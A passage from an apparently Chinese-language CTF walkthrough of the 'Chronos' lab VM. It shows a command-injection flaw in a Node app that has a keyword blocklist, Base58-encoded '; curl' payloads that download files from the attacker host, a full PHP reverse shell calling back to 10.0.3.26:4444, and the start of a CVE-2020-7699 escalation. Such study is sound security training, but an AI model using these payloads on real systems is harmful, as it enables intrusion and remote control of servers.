定义根路由，发送HTML文件</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&quot;/var/www/html/index.html&quot;</span>); <span class="comment">// 返回位于/var/www/html/index.html的文件</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义&#x27;/date&#x27;路由</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> agent = req.<span class="property">headers</span>[<span class="string">&#x27;user-agent&#x27;</span>]; <span class="comment">// 获取请求头中的用户代理</span></span><br><span class="line">    <span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>; <span class="comment">// 定义基础命令</span></span><br><span class="line">    <span class="keyword">const</span> format = req.<span class="property">query</span>.<span class="property">format</span>; <span class="comment">// 获取查询参数&#x27;format&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> bytes = bs58.<span class="title function_">decode</span>(format); <span class="comment">// 解码Base58编码的&#x27;format&#x27;</span></span><br><span class="line">    <span class="keyword">var</span> decoded = bytes.<span class="title function_">toString</span>(); <span class="comment">// 将解码后的字节转换为字符串</span></span><br><span class="line">    <span class="keyword">var</span> concat = cmd.<span class="title function_">concat</span>(decoded); <span class="comment">// 将基础命令与解码字符串连接</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查用户代理是否为&#x27;Chronos&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 检查连接的命令是否包含潜在危险命令</span></span><br><span class="line">        <span class="keyword">if</span> (concat.<span class="title function_">includes</span>(<span class="string">&#x27;id&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;whoami&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;python&#x27;</span>) || </span><br><span class="line">            concat.<span class="title function_">includes</span>(<span class="string">&#x27;nc&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;bash&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;php&#x27;</span>) || </span><br><span class="line">            concat.<span class="title function_">includes</span>(<span class="string">&#x27;which&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;Something went wrong&quot;</span>); <span class="comment">// 如果包含危险命令，返回错误消息</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 执行连接的命令</span></span><br><span class="line">        <span class="title function_">exec</span>(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`error: <span class="subst">$&#123;error.message&#125;</span>`</span>); <span class="comment">// 记录错误消息</span></span><br><span class="line">                <span class="keyword">return</span>; <span class="comment">// 退出</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>); <span class="comment">// 记录标准错误输出</span></span><br><span class="line">                <span class="keyword">return</span>; <span class="comment">// 退出</span></span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="title function_">send</span>(stdout); <span class="comment">// 返回标准输出</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;Permission Denied&quot;</span>); <span class="comment">// 如果用户代理不是&#x27;Chronos&#x27;，返回权限拒绝消息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器并监听指定端口</span></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at <span class="subst">$&#123;port&#125;</span>`</span>); <span class="comment">// 输出服务器正在运行的消息</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>app.js 过滤了一定的危险命令，不过经测 curl 可正常使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cat osinject         </span></span><br><span class="line">; curl --version</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cat osinject | base58</span></span><br><span class="line">ZE78raFHEiGiS81mJiynCch </span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409251710525.jpg" /></p>
+<p>利用 curl 传个 phpinfo() 试试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># echo &quot;3bhWGWbRuE8mRLiacqF4fuPENJHQmXBFNSjQJwZ58HcvUKJhns9ci8GdAd9iZgV8VMZCJvtgwnbMqvEBxxZs7rpkxDJxojQm&quot; | base58 -d</span></span><br><span class="line">; curl http://10.0.3.26:8000/phpinfo.php -o /var/www/html/phpinfo.php</span><br></pre></td></tr></table></figure>
+<p>注，经测需指定保存至 web 目录下，默认位置在 opt 下</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409251711897.jpg" /></p>
+<p>虽然输出了 Something went wrong，但通过 <code>ls /var/www/html</code>
+可看到已经成功下载</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409251712273.jpg" /></p>
+<p>php 可成功被解析执行</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409251712274.jpg" /></p>
+<p>同理传个 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cat osinject         </span></span><br><span class="line">; curl http://10.0.3.26:8000/re_shell.php -o /var/www/html/re_shell.php</span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cat osinject | base58</span></span><br><span class="line">scqkRAVjkoHPt9Tj6nRfYgtVu2FWvjraFnqLCvc5KAvzqtsFSQzXpKaceviJE1bQWWdkoyEg9PuJ5eWngf2zSQPRVvCp9rTCKB </span><br></pre></td></tr></table></figure>
+<p>re_shell.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</span></span><br><span class="line"><span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;10.0.3.26&#x27;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">4444</span>;</span><br><span class="line"><span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line"><span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">                <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">                <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">                <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line">                <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">                <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">                <span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>反弹 shell 成功</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409251717209.jpg" /></p>
+<h3 id="提权至-imera">2.2. 提权至 imera</h3>
+<p>opt 下找到个 root 用户的 chronos-v2</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">www-data@chronos:/opt$ <span class="built_in">ls</span> -al</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  4 root     root     4096 Jul 30  2021 .</span><br><span class="line">drwxr-xr-x 23 root     root     4096 Jul 29  2021 ..</span><br><span class="line">drwxr-xr-x  3 www-data www-data 4096 Sep 25 08:50 chronos</span><br><span class="line">drwxr-xr-x  4 root     root     4096 Aug  3  2021 chronos-v2</span><br><span class="line">www-data@chronos:/opt$ </span><br><span class="line">www-data@chronos:/opt$ <span class="built_in">cd</span> chronos-v2/</span><br><span class="line">www-data@chronos:/opt/chronos-v2$ </span><br><span class="line">www-data@chronos:/opt/chronos-v2$ <span class="built_in">ls</span> -al</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 4 root root 4096 Aug  3  2021 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Jul 30  2021 ..</span><br><span class="line">drwxr-xr-x 3 root root 4096 Aug  3  2021 backend</span><br><span class="line">drwxr-xr-x 3 root root 4096 Aug  3  2021 frontend</span><br><span class="line">-rw-r--r-- 1 root root  381 Aug  3  2021 index.html</span><br><span class="line">www-data@chronos:/opt/chronos-v2$ </span><br><span class="line">www-data@chronos:/opt/chronos-v2$ <span class="built_in">cd</span> backend/</span><br><span class="line">www-data@chronos:/opt/chronos-v2/backend$ </span><br><span class="line">www-data@chronos:/opt/chronos-v2/backend$ <span class="built_in">ls</span> -al</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x  3 root root  4096 Aug  3  2021 .</span><br><span class="line">drwxr-xr-x  4 root root  4096 Aug  3  2021 ..</span><br><span class="line">drwxr-xr-x 71 root root  4096 Aug  3  2021 node_modules</span><br><span class="line">-rw-r--r--  1 root root 43066 Aug  3  2021 package-lock.json</span><br><span class="line">-rw-r--r--  1 root root   296 Jul 29  2021 package.json</span><br><span class="line">-rw-r--r--  1 root root   505 Aug  3  2021 server.js</span><br><span class="line">www-data@chronos:/opt/chronos-v2/backend$ </span><br><span class="line">www-data@chronos:/opt/chronos-v2/backend$ <span class="built_in">cat</span> server.js </span><br><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line">const fileupload = require(<span class="string">&quot;express-fileupload&quot;</span>);</span><br><span class="line">const http = require(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.use(fileupload(&#123; parseNested: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&quot;/opt/chronos-v2/frontend/pages&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">   res.render(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const server = http.Server(app);</span><br><span class="line">const addr = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">const port = 8080;</span><br><span class="line">server.listen(port, addr, () =&gt; &#123;</span><br><span class="line">   console.log(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);www-data@chronos:/opt/chronos-v2/backend$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>查询网络状态发现该服务已经在 8080 端口启动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data@chronos:/opt/chronos-v2/backend$ ss -tuln</span><br><span class="line">Netid               State                 Recv-Q                Send-Q                                   Local Address:Port                                Peer Address:Port                </span><br><span class="line">udp                 UNCONN                0                     0                                        127.0.0.53%lo:53                                       0.0.0.0:*                   </span><br><span class="line">udp                 UNCONN                0                     0                                     10.0.3.27%enp0s3:68                                       0.0.0.0:*                   </span><br><span class="line">tcp                 LISTEN                0                     128                                          127.0.0.1:8080                                     0.0.0.0:*                   </span><br><span class="line">tcp                 LISTEN                0                     128                                      127.0.0.53%lo:53                                       0.0.0.0:*                   </span><br><span class="line">tcp                 LISTEN                0                     128                                            0.0.0.0:22                                       0.0.0.0:*                   </span><br><span class="line">tcp                 LISTEN                0                     128                                                  *:8000                                           *:*                   </span><br><span class="line">tcp                 LISTEN                0                     128                                                  *:80                                             *:*                   </span><br><span class="line">tcp                 LISTEN                0                     128                                               [::]:22                                          [::]:*                   </span><br><span class="line">www-data@chronos:/opt/chronos-v2/backend$  </span><br></pre></td></tr></table></figure>
+<p>由于仅限于本地连接，所以可基于前面的 shell 实现个内网穿透的代理，利用
+Neo-reGeorg 实现隧道代理，具体操作参见官方介绍，实现后的效果如下</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">GitHub -
+L-codes/Neo-reGeorg: Neo-reGeorg is a project that seeks to aggressively
+refactor reGeorg</a></p>
+</blockquote>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409261207846.jpg" /></p>
+<p>没找到可利用信息，谷歌 <span
+class="math inline">\(\Rightarrow\)</span> 该服务存在 CVE-2020-7699【属
+JavaScript Prototype 污染攻击】可利用</p>
+<blockquote>
+<p><a
+target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/246029.html">CVE-2020-7699漏洞分析 -
+FreeBuf网络安全行业门户</a><br />
+CVE-2020-7699：NodeJS模块代码注入<br />
+该漏洞完全是由于Nodejs的express-fileupload模块引起，该模块的1.1.8之前的版本存在原型链污染（Prototype
+Pollution）漏洞，当然，引发该漏洞，需要一定的配置：parseNested选项设置为true<br />
+该漏洞可以引发DOS拒绝服务攻击，配合ejs模板引擎，可以达到RCE的目的</p>
+<p>JavaScript Prototype 污染攻击原理：<a
+target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解
+JavaScript Prototype 污染攻击 | 离别歌</a></p>
+</blockquote>
+<p>server.js【由代码知满足 CVE-2020-7699 利用条件】</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入所需的模块</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); <span class="comment">// 引入 Express 框架，用于构建 web 服务器</span></span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&quot;express-fileupload&quot;</span>); <span class="comment">// 引入 express-fileupload 中间件，用于处理文件上传</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>); <span class="comment">// 引入 Node.js 内置的 HTTP 模块，用于创建 